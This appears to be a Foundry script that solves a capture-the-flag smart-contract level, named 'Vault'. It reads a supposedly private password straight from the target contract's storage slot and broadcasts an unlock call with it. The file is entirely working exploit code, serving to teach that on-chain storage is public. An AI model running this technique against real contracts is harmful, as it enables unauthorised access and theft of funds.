// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

interface IVault {
    function unlock(bytes32 _password) external;
}

contract VaultSolution is Script {
    function run() external {
        address vaultAddress = 0xF70AA12568F8d28d87Fd5dF361A58Ab6B41BD563;
        bytes32 password = vm.load(vaultAddress, bytes32(uint256(1)));

        vm.startBroadcast();
        IVault(vaultAddress).unlock(password);
        vm.stopBroadcast();
    }
}
